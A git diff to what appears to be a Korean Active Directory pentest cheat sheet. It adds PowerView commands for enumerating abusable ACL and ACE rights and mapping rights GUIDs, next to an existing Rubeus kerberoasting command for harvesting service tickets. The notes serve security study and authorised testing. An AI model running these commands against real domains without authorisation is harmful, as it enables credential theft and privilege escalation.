@@ -467,3 +467,33 @@ Get-DomainUser * -spn | select samaccountname
 ### 특정 사용자 Ticket 수집 (RC4 암호화만 원할 때, /tgtdeleg 플래그)
 ```Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap```
 
+<br/><br/>
+# Access Control List(ACL) & Access Control Entries(ACE) Abuse
+
+## 1. PowerView를 사용하여 ACL 열거
+
+### Find-InterestingDomainAcl 사용
+```Find-InterestingDomainAcl```
+
+### 특정 사용자 타겟 (예 : wley)
+```
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid wley
+```
+
+### Get-DomainObjectACL 사용
+```Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}```
+
+### GUID 값으로 Reverse Search & Mapping 
+```
+$guid= "00299570-246d-11d0-a768-00aa006e0529"
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+```
+
+### ObjectAceType 속성 자동 변환(-ResolveGUIDs 플래그)
+```Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}```
+
+
+
+
+
